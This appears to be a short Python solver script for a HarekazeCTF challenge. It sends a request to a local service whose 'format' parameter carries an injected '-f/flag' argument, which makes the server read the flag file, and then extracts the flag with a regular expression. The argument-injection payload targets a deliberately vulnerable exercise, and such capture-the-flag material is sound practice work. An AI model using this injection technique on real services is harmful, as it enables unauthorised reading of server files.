import os
import re
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8001')
url = 'http://{}:{}/'.format(host, port)

# Go!
r = requests.get(url + "?format='%20'-f/flag")
flag = re.findall(r'(HarekazeCTF\{.+?\})', r.text)[0]

print(flag)
